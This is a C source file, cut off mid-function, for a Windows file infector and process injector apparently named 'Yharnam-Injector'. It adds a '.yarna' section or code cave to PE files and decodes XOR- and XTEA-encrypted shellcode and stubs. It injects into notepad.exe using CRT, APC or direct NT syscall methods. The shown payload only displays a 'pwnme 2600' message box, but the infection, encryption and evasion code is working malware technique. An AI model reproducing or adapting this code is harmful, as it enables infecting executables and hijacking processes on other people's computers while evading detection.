#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stddef.h>
#include <stdint.h>
#include <synchapi.h> 
#define VIRUS_SECTION_NAME ".yarna"
#define TARGET_PROCESS_NAME "notepad.exe"
#define STUB_SIZE 64
#define MESSAGE_TEXT "pwnme 2600"
#define STATIC_STUB_SIGNATURE "YARN"
#define STATIC_STUB_SIGNATURE_SIZE 4
#define STATIC_STUB_SIZE 25
#define STATIC_STUB_OEP_OFFSET 15
#define APC_STUB_SIZE 50

// Conditional debug logging
#ifdef _DEBUG
#define DEBUG_PRINT(fmt, ...) printf("[DEBUG] " fmt, ##__VA_ARGS__)
#else
#define DEBUG_PRINT(fmt, ...) do {} while (0)
#endif

typedef LONG NTSTATUS;
#define STATUS_SUCCESS ((NTSTATUS)0)

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

#define InitializeObjectAttributes(p,n,a,r,s) \
    do { \
        (p)->Length = sizeof(OBJECT_ATTRIBUTES); \
        (p)->RootDirectory = r; \
        (p)->Attributes = a; \
        (p)->ObjectName = n; \
        (p)->SecurityDescriptor = s; \
        (p)->SecurityQualityOfService = NULL; \
    } while(0)

typedef NTSTATUS(NTAPI* NtCreateSectionPtr)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
typedef NTSTATUS(NTAPI* NtMapViewOfSectionPtr)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);
typedef NTSTATUS(NTAPI* RtlCreateUserThreadPtr)(HANDLE, PSECURITY_DESCRIPTOR, BOOLEAN, ULONG, PULONG, PULONG, PVOID, PVOID, PHANDLE, PCLIENT_ID);
typedef NTSTATUS(NTAPI* ZwUnmapViewOfSectionPtr)(HANDLE, PVOID);
typedef NTSTATUS(NTAPI* NtAllocateVirtualMemoryPtr)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS(NTAPI* NtWriteVirtualMemoryPtr)(HANDLE, PVOID, const VOID*, ULONG, PULONG);
typedef NTSTATUS(NTAPI* NtProtectVirtualMemoryPtr)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS(NTAPI* NtCreateThreadExPtr)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

typedef struct _NT_FUNCTIONS {
    NtAllocateVirtualMemoryPtr NtAllocateVirtualMemory;
    NtWriteVirtualMemoryPtr NtWriteVirtualMemory;
    NtProtectVirtualMemoryPtr NtProtectVirtualMemory;
    NtCreateThreadExPtr NtCreateThreadEx;
} NT_FUNCTIONS;

typedef enum _INJECTION_TECHNIQUE {
    INJECT_TECHNIQUE_CRT = 0,
    INJECT_TECHNIQUE_APC,
    INJECT_TECHNIQUE_SYSCALL
} INJECTION_TECHNIQUE;

static BOOL InfectFile(const char* path, BOOL useSection);
static DWORD FindTargetPid(const char* name);
static BOOL InjectPid(DWORD pid, INJECTION_TECHNIQUE technique);
static uintptr_t GetRemoteModuleBase(DWORD pid, const char* modName);

/**
 * \fn static void* memmem_local(const void* hay, size_t haylen, const void* ned, size_t nedlen)
 * \brief Search for a needle byte sequence within a haystack.
 *
 * \param hay Pointer to the haystack buffer.
 * \param haylen Length of the haystack buffer in bytes.
 * \param ned Pointer to the needle buffer.
 * \param nedlen Length of the needle buffer in bytes.
 * \return Pointer to the first occurrence of the needle in the haystack, or NULL if not found.
 */
static void* memmem_local(const void* hay, size_t haylen,
    const void* ned, size_t nedlen)
{
    if (nedlen > haylen) return NULL;
    for (size_t i = 0; i <= haylen - nedlen; i++) {
        if (memcmp((char*)hay + i, ned, nedlen) == 0)
            return (char*)hay + i;
    }
    return NULL;
}


/**
 * \fn static void* LoadShellcode(DWORD* outSize)
 * \brief Load embedded shellcode from hardcoded array (XOR encoded).
 *
 * \param outSize Optional output; receives the size of the loaded shellcode.
 * \return Pointer to the shellcode in memory, or NULL on failure.
 */
static void* LoadShellcode(DWORD* outSize) {
    printf("[DEBUG] LoadShellcode: using hardcoded XOR encoded shellcode\n");
    
    // XOR encoded payload bytes (XOR key = 0xAB)
    static const BYTE encoded_shellcode[] = {
        0xCF, 0x2D, 0xAF, 0xAB, 0xB3, 0x11, 0xD4, 0xC3, 0xF7, 0xAA, 0xAB, 0xAB, 
        0xBA, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0x85, 0xDF, 0xCE, 0xD3, 
        0xDF, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 
        0xFA, 0xAB, 0xAB, 0xAB, 0x1F, 0xAB, 0xAB, 0xAB, 0xAE, 0xAA, 0xAB, 0xAB, 
        0xAB, 0xAB, 0xAB, 0xAB, 0xAD, 0xAB, 0xAB, 0xAB, 0x8B, 0xAB, 0xFB, 0xCB, 
        0x85, 0xD9, 0xCF, 0xCA, 0xDF, 0xCA, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 
        0xAB, 0xAB, 0xAB, 0xAB, 0xA0, 0xAB, 0xAB, 0xAB, 0xEA, 0xAA, 0xAB, 0xAB, 
        0xE7, 0xAA, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 
        0xEB, 0xAB, 0xEB, 0xEB, 0x85, 0xC9, 0xD8, 0xD8, 0xAB, 0xAB, 0xAB, 0xAB, 
        0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xA0, 0xAB, 0xAB, 0xAB, 
        0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 
        0xAB, 0xAB, 0xAB, 0xAB, 0x2B, 0xAB, 0x9B, 0x6B, 0x85, 0xC2, 0xCF, 0xCA, 
        0xDF, 0xCA, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 
        0xBB, 0xAB, 0xAB, 0xAB, 0xE7, 0xAA, 0xAB, 0xAB, 0xF7, 0xAA, 0xAB, 0xAB, 
        0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0x8B, 0xAB, 0xFB, 0xCB, 
        0xE3, 0x26, 0x9E, 0xAB, 0xAB, 0xAB, 0xAB, 0xE3, 0x26, 0x96, 0xAB, 0xAB, 
        0xAB, 0xAB, 0x12, 0xA0, 0xAB, 0xAB, 0xAB, 0x1B, 0x00, 0x21, 0xB5, 0x9B, 
        0x68, 0x23, 0xB4, 0xE3, 0x54, 0x6D, 0xE3, 0x54, 0x6C, 0x49, 0x59, 0xE3, 
        0x9A, 0x62, 0xE3, 0x26, 0xBE, 0xAB, 0xAB, 0xAB, 0xAB, 0xE7, 0x26, 0xAE, 
        0xAB, 0xAB, 0xAB, 0xAB, 0x68, 0x26, 0xBE, 0xAB, 0xAB, 0xAB, 0xAB, 0xE3, 
        0x26, 0x9E, 0xAB, 0xAB, 0xAB, 0xAB, 0xE3, 0x9A, 0x62, 0xE3, 0x26, 0xBE, 
        0xAB, 0xAB, 0xAB, 0xAB, 0xE7, 0x9A, 0x6E, 0xAB, 0xAB, 0xAB, 0xAB, 0xE3, 
        0x9A, 0x62, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 
        0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 
        0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 
        0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 
        0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 
        0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 
        0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 
        0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 
        0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 
        0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 
        0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 
        0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 
        0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 
        0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 
        0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 
        0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 
        0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 
        0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 
        0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 
        0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 
        0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 
        0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 
        0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 
        0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 
        0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 
        0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 
        0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 
        0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 
        0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 
        0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 
        0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 
        0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 
        0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 
        0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 
        0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 
        0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 
        0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 
        0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 
        0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 
        0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 
        0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB
    };
    
    static BYTE decoded_shellcode[sizeof(encoded_shellcode)];
    static BOOL decoded = FALSE;
    
    if (!decoded) {
        // Decode the shellcode at runtime
        for (size_t i = 0; i < sizeof(encoded_shellcode); i++) {
            decoded_shellcode[i] = encoded_shellcode[i] ^ 0xAB;
        }
        decoded = TRUE;
        printf("[DEBUG] LoadShellcode: decoded %zu bytes\n", sizeof(decoded_shellcode));
    }
    
    if (outSize) *outSize = sizeof(decoded_shellcode);
    
    return decoded_shellcode;
}

/**
 * \fn static uint32_t Fnv1a32(const uint8_t* data, size_t len)
 * \brief Compute a small runtime-derived key component using FNV-1a.
 */
static uint32_t Fnv1a32(const uint8_t* data, size_t len) {
    uint32_t hash = 2166136261u;
    for (size_t i = 0; i < len; i++) {
        hash ^= data[i];
        hash *= 16777619u;
    }
    return hash;
}

/**
 * \fn static void DeriveKey(uint32_t key[4])
 * \brief Derive a 128-bit key at runtime from a static seed.
 */
static void DeriveKey(uint32_t key[4]) {
    static const uint8_t seed[] = "Yharnam-Injector-Key";
    const uint32_t h = Fnv1a32(seed, sizeof(seed) - 1);
    key[0] = 0xA3B1BAC6u ^ h;
    key[1] = 0x56AA3350u + h;
    key[2] = 0x677D9197u ^ (h << 1);
    key[3] = 0xB27022DCu + (h << 2);
}

/**
 * \fn static void XteaEncryptBlock(uint32_t v[2], const uint32_t key[4])
 * \brief Encrypt a single 64-bit block with XTEA (32 rounds).
 */
static void XteaEncryptBlock(uint32_t v[2], const uint32_t key[4]) {
    uint32_t v0 = v[0], v1 = v[1];
    uint32_t sum = 0;
    const uint32_t delta = 0x9E3779B9u;
    for (uint32_t i = 0; i < 32; i++) {
        v0 += (((v1 << 4) ^ (v1 >> 5)) + v1) ^ (sum + key[sum & 3]);
        sum += delta;
        v1 += (((v0 << 4) ^ (v0 >> 5)) + v0) ^ (sum + key[(sum >> 11) & 3]);
    }
    v[0] = v0;
    v[1] = v1;
}

/**
 * \fn static void XteaCryptCtr(BYTE* data, size_t len)
 * \brief Encrypt/decrypt a buffer using XTEA in CTR mode.
 */
static void XteaCryptCtr(BYTE* data, size_t len) {
    static const uint64_t nonce = 0x6E6F6E6365596859ULL; // obfuscated nonce
    uint32_t key[4];
    DeriveKey(key);

    uint64_t counter = nonce;
    size_t offset = 0;
    while (offset < len) {
        uint32_t block[2] = { (uint32_t)counter, (uint32_t)(counter >> 32) };
        BYTE stream[8];
        XteaEncryptBlock(block, key);
        memcpy(stream, block, sizeof(stream));
        size_t chunk = (len - offset) < sizeof(stream) ? (len - offset) : sizeof(stream);
        for (size_t i = 0; i < chunk; i++) {
            data[offset + i] ^= stream[i];
        }
        counter++;
        offset += chunk;
    }
}

static void DecryptPayload(BYTE* dst, const BYTE* src, size_t len) {
    memcpy(dst, src, len);
    XteaCryptCtr(dst, len);
}

static const BYTE encrypted_message[] = {
    0xEE, 0x1D, 0x3E, 0xE4, 0x1B, 0x69, 0x20, 0x38, 0x3F, 0x4B, 0x23
};

static const BYTE encrypted_crt_stub[STUB_SIZE] = {
    0xD6, 0x5B, 0x99, 0xC1, 0xC4, 0x49, 0x12, 0x0E, 0x0F, 0x7B, 0x23, 0x56, 0x29, 0x6D, 0xD1, 0x4E,
    0x40, 0x90, 0x81, 0x11, 0x43, 0x7E, 0xD8, 0x35, 0x84, 0x14, 0x47, 0x3A, 0x85, 0x79, 0x01, 0x35,
    0x15, 0x12, 0xB5, 0x6A, 0x0A, 0x31, 0xE8, 0xD9, 0x96, 0x94, 0x54, 0x81, 0x45, 0xD9, 0x8E, 0xC8,
    0xBB, 0x21, 0xEE, 0x40, 0xC1, 0x49, 0x5F, 0x34, 0x4E, 0xAB, 0xFA, 0x4C, 0xA8, 0xDF, 0x60, 0x6C
};

static const BYTE encrypted_apc_stub[APC_STUB_SIZE] = {
    0xD6, 0x5B, 0x99, 0xC1, 0xC4, 0x49, 0x12, 0x0E, 0x0F, 0x7B, 0x23, 0x56, 0x29, 0x6D, 0xD1, 0x4E,
    0x40, 0x90, 0x81, 0x11, 0x43, 0x7E, 0xD8, 0x35, 0x84, 0x14, 0x47, 0x3A, 0x85, 0x79, 0x01, 0x35,
    0x15, 0x12, 0xB5, 0x6A, 0x0A, 0x31, 0xE8, 0xD9, 0x96, 0x94, 0x54, 0x81, 0x45, 0xD9, 0x8E, 0xC8,
    0xBB, 0xAA
};

static const BYTE encrypted_static_stub[STATIC_STUB_SIZE] = {
    0xFB, 0x22, 0xDB, 0x8D, 0x5B, 0x29, 0x12, 0x0E, 0x0F, 0x33, 0xA8, 0x16, 0x39, 0x6C, 0x6C, 0x4E,
    0x40, 0x90, 0x81, 0xEE, 0xA3, 0x27, 0x99, 0x26, 0x73
};

static BOOL BuildRemoteStubCrt(BYTE* stub, size_t size, LPVOID remoteMsg, uintptr_t msgAddr, uintptr_t exitAddr) {
    if (size != STUB_SIZE) {
        return FALSE;
    }
    DecryptPayload(stub, encrypted_crt_stub, size);
    const UINT32 mbOK = MB_OK;
    memcpy(stub + 5, &remoteMsg, sizeof(remoteMsg));
    memcpy(stub + 15, &remoteMsg, sizeof(remoteMsg));
    memcpy(stub + 25, &mbOK, sizeof(mbOK));
    memcpy(stub + 35, &msgAddr, sizeof(msgAddr));
    memcpy(stub + 54, &exitAddr, sizeof(exitAddr));
    return TRUE;
}

static BOOL BuildRemoteStubApc(BYTE* stub, size_t size, LPVOID remoteMsg, uintptr_t msgAddr) {
    if (size != APC_STUB_SIZE) {
        return FALSE;
    }
    DecryptPayload(stub, encrypted_apc_stub, size);
    const UINT32 mbOK = MB_OK;
    memcpy(stub + 5, &remoteMsg, sizeof(remoteMsg));
    memcpy(stub + 15, &remoteMsg, sizeof(remoteMsg));
    memcpy(stub + 25, &mbOK, sizeof(mbOK));
    memcpy(stub + 35, &msgAddr, sizeof(msgAddr));
    return TRUE;
}

static BOOL BuildStaticStub(BYTE* stub, size_t size, DWORD originalEntryRva) {
    if (size != STATIC_STUB_SIZE) {
        return FALSE;
    }
    DecryptPayload(stub, encrypted_static_stub, size);
    memcpy(stub + STATIC_STUB_OEP_OFFSET, &originalEntryRva, sizeof(originalEntryRva));
    return TRUE;
}


/**
 * \fn uintptr_t GetRemoteProcAddress(DWORD pid, const char* dll, const char* fn)
 * \brief Compute the address of an API function in a remote process by RVA.
 *
 * \param pid Process ID of the target process.
 * \param dll Name of the DLL exporting the function (e.g. "user32.dll").
 * \param fn Name of the function to locate (e.g. "MessageBoxA").
 * \return The absolute address of the function in the target process, or 0 on failure.
 */
uintptr_t GetRemoteProcAddress(DWORD pid, const char* dll, const char* fn) {
    HMODULE hLocalMod = GetModuleHandleA(dll);
    uintptr_t localBase = (uintptr_t)hLocalMod;
    uintptr_t localFn = (uintptr_t)GetProcAddress(hLocalMod, fn);
    uintptr_t offset = localFn - localBase;
    uintptr_t remoteBase = GetRemoteModuleBase(pid, dll);
    return remoteBase + offset;
}

/**
 * \fn BOOL PatchShellcodeRemote(HANDLE hProc, DWORD pid, BYTE* code, size_t size)
 * \brief Patch two 8-byte placeholders in shellcode with remote function addresses.
 *
 * \param hProc Handle to the target process.
 * \param pid Process ID of the target process.
 * \param code Pointer to the shellcode buffer in local memory.
 * \param size Size of the shellcode in bytes.
 * \return TRUE on success, FALSE if placeholders are missing or write fails.
 */
BOOL PatchShellcodeRemote(
    HANDLE hProc,
    DWORD  pid,
    BYTE* code,
    size_t size
) {
    const BYTE zero8[8] = { 0 };

    BYTE* slot1 = memmem_local(code, size, zero8, 8);
    if (!slot1) {
        printf("[ERROR] placeholder #1 not found\n");
        return FALSE;
    }

    BYTE* slot2 = memmem_local(
        slot1 + 8,
        size - (size_t)((slot1 + 8) - code),
        zero8, 8
    );
    if (!slot2) {
        printf("[ERROR] placeholder #2 not found\n");
        return FALSE;
    }

    uintptr_t remoteMsg = GetRemoteProcAddress(pid, "user32.dll", "MessageBoxA");
    printf("[DEBUG] remote MessageBoxA = 0x%p\n", (void*)remoteMsg);
    if (!WriteProcessMemory(hProc, slot1, &remoteMsg, 8, NULL)) {
        printf("[ERROR] WriteProcessMemory MsgBoxA failed: %u\n", GetLastError());
        return FALSE;
    }

    uintptr_t remoteExit = GetRemoteProcAddress(pid, "kernel32.dll", "ExitThread");
    printf("[DEBUG] remote ExitThread = 0x%p\n", (void*)remoteExit);
    if (!WriteProcessMemory(hProc, slot2, &remoteExit, 8, NULL)) {
        printf("[ERROR] WriteProcessMemory ExitThread failed: %u\n", GetLastError());
        return FALSE;
    }

    return TRUE;
}

/**
 * \fn static DWORD AlignUp(DWORD val, DWORD align)
 * \brief Round up a value to the next multiple of a given alignment.
 *
 * \param val The value to align.
 * \param align The alignment boundary (must be power of two).
 * \return The smallest multiple of align greater than or equal to val.
 */
static DWORD AlignUp(DWORD val, DWORD align) {
    return (val + align - 1) & ~(align - 1);
}

static BOOL RvaToFileOffset(const IMAGE_SECTION_HEADER* secs, WORD nsec, DWORD rva, DWORD* outOffset) {
    if (!secs || !outOffset) return FALSE;
    for (WORD i = 0; i < nsec; i++) {
        DWORD va = secs[i].VirtualAddress;
        DWORD size = max(secs[i].Misc.VirtualSize, secs[i].SizeOfRawData);
        if (rva >= va && rva < va + size) {
            *outOffset = secs[i].PointerToRawData + (rva - va);
            return TRUE;
        }
    }
    return FALSE;
}

static BOOL IsCaveByte(BYTE value) {
    return value == 0x00 || value == 0xCC;
}

static BOOL FindCodeCave(
    const IMAGE_SECTION_HEADER* secs,
    WORD nsec,
    const BYTE* fileData,
    DWORD fileSize,
    DWORD payloadSize,
    DWORD* outRva,
    DWORD* outFileOffset
) {
    if (!secs || !fileData || !outRva || !outFileOffset) return FALSE;
    for (WORD i = 0; i < nsec; i++) {
        if ((secs[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) == 0) {
            continue;
        }
        DWORD rawStart = secs[i].PointerToRawData;
        DWORD rawSize = secs[i].SizeOfRawData;
        if (rawStart >= fileSize || rawStart + rawSize > fileSize || rawSize < payloadSize) {
            continue;
        }
        DWORD run = 0;
        for (DWORD offset = 0; offset < rawSize; offset++) {
            if (IsCaveByte(fileData[rawStart + offset])) {
                run++;
                if (run >= payloadSize) {
                    DWORD caveOffset = offset + 1 - run;
                    *outRva = secs[i].VirtualAddress + caveOffset;
                    *outFileOffset = rawStart + caveOffset;
                    return TRUE;
                }
            }
            else {
                run = 0;
            }
        }
    }
    return FALSE;
}


/**
 * \fn static uintptr_t GetRemoteModuleBase(DWORD pid, const char* modName)
 * \brief Find the base address of a module loaded in a remote process.
 *
 * \param pid Process ID of the target process.
 * \param modName Name of the module (e.g. "kernel32.dll").
 * \return The base address of the module in the target process, or 0 on failure.
 */
static uintptr_t GetRemoteModuleBase(DWORD pid, const char* modName) {
    MODULEENTRY32 me = { sizeof(me) };
    HANDLE moduleSnapshot = CreateToolhelp32Snapshot(
        TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32,
        pid
    );
    if (moduleSnapshot == INVALID_HANDLE_VALUE) {
        printf("[ERROR] SnapModules(%u) failed: %u\n", pid, GetLastError());
        return 0;
    }

    if (!Module32First(moduleSnapshot, &me)) {
        printf("[ERROR] Module32First(%u) failed: %u\n", pid, GetLastError());
        CloseHandle(moduleSnapshot);
        return 0;
    }

    do {
        printf("[DEBUG]   saw module %-20s @ %p\n",
            me.szModule, me.modBaseAddr);
        if (_stricmp(me.szModule, modName) == 0) {
            uintptr_t base = (uintptr_t)me.modBaseAddr;
            CloseHandle(moduleSnapshot);
            return base;
        }
    } while (Module32Next(moduleSnapshot, &me));

    CloseHandle(moduleSnapshot);
    return 0;
}


/**
 * \fn static DWORD64 GetRemoteAddressByRVA(DWORD pid, const char* moduleName, FARPROC localAddr)
 * \brief Translate a local function pointer to its remote equivalent via RVA.
 *
 * \param pid Process ID of the target process.
 * \param moduleName Name of the module containing the function.
 * \param localAddr The local function pointer obtained via GetProcAddress.
 * \return The computed remote function address, or 0 on failure.
 */
static DWORD64 GetRemoteAddressByRVA(DWORD pid, const char* moduleName, FARPROC localAddr) {
    HMODULE localBase = GetModuleHandleA(moduleName);
    if (!localBase) {
        printf("[ERROR] GetModuleHandleA(%s) failed\n", moduleName);
        return 0;
    }

    uintptr_t offset = (uintptr_t)localAddr - (uintptr_t)localBase;

    uintptr_t remoteBase = GetRemoteModuleBase(pid, moduleName);
    if (!remoteBase) {
        return 0;
    }

    printf(
        "[DEBUG] GetRemoteAddressByRVA(%s): localBase=%p  localFn=%p  offset=0x%Ix  remoteBase=0x%Ix\n",
        moduleName, localBase, localAddr, offset, remoteBase
    );

    return (DWORD64)remoteBase + offset;
}

static BOOL ResolveNtFunctions(NT_FUNCTIONS* nt) {
    if (!nt) return FALSE;
    memset(nt, 0, sizeof(*nt));

    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) {
        ntdll = LoadLibraryA("ntdll.dll");
    }
    if (!ntdll) {
        return FALSE;
    }

    nt->NtAllocateVirtualMemory = (NtAllocateVirtualMemoryPtr)GetProcAddress(ntdll, "NtAllocateVirtualMemory");
    nt->NtWriteVirtualMemory = (NtWriteVirtualMemoryPtr)GetProcAddress(ntdll, "NtWriteVirtualMemory");
    nt->NtProtectVirtualMemory = (NtProtectVirtualMemoryPtr)GetProcAddress(ntdll, "NtProtectVirtualMemory");
    nt->NtCreateThreadEx = (NtCreateThreadExPtr)GetProcAddress(ntdll, "NtCreateThreadEx");

    return nt->NtAllocateVirtualMemory && nt->NtWriteVirtualMemory && nt->NtProtectVirtualMemory;
}

static BOOL RemoteAllocWrite(
    HANDLE hProc,
    const void* data,
    SIZE_T size,
    DWORD allocProtect,
    DWORD finalProtect,
    BOOL useSyscalls,
    const NT_FUNCTIONS* nt,
    LPVOID* outRemote
) {
    if (!outRemote || !data || size == 0) {
        return FALSE;
    }

    LPVOID remote = NULL;
    SIZE_T regionSize = size;
    if (useSyscalls && nt && nt->NtAllocateVirtualMemory) {
        NTSTATUS status = nt->NtAllocateVirtualMemory(
            hProc, (PVOID*)&remote, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, allocProtect);
        if (!NT_SUCCESS(status) || !remote) {
            printf(" [ERROR] NtAllocateVirtualMemory failed: 0x%08X\n", status);
            return FALSE;
        }
    }
    else {
        remote = VirtualAllocEx(hProc, NULL, size, MEM_COMMIT | MEM_RESERVE, allocProtect);
        if (!remote) {
            printf(" [ERROR] VirtualAllocEx failed: %lu\n", GetLastError());
            return FALSE;
        }
    }

    if (useSyscalls && nt && nt->NtWriteVirtualMemory) {
        ULONG written = 0;
        NTSTATUS status = nt->NtWriteVirtualMemory(
            hProc, remote, data, (ULONG)size, &written);
        if (!NT_SUCCESS(status) || written != size) {
            printf(" [ERROR] NtWriteVirtualMemory failed: 0x%08X\n", status);
            return FALSE;
        }
    }
    else {
        SIZE_T written = 0;
        if (!WriteProcessMemory(hProc, remote, data, size, &written) || written != size) {
            printf(" [ERROR] WriteProcessMemory failed: %lu\n", GetLastError());
            return FALSE;
        }
    }

    if (finalProtect != allocProtect) {
        DWORD oldProtect = 0;
        if (useSyscalls && nt && nt->NtProtectVirtualMemory) {
            PVOID protectAddr = remote;
            SIZE_T protectSize = regionSize;
            NTSTATUS status = nt->NtProtectVirtualMemory(
                hProc, &protectAddr, &protectSize, finalProtect, &oldProtect);
            if (!NT_SUCCESS(status)) {
                printf(" [WARN] NtProtectVirtualMemory failed: 0x%08X\n", status);
            }
        }
        else {
            if (!VirtualProtectEx(hProc, remote, size, finalProtect, &oldProtect)) {
                printf(" [WARN] VirtualProtectEx failed: %lu\n", GetLastError());
            }
        }
    }

    *outRemote = remote;
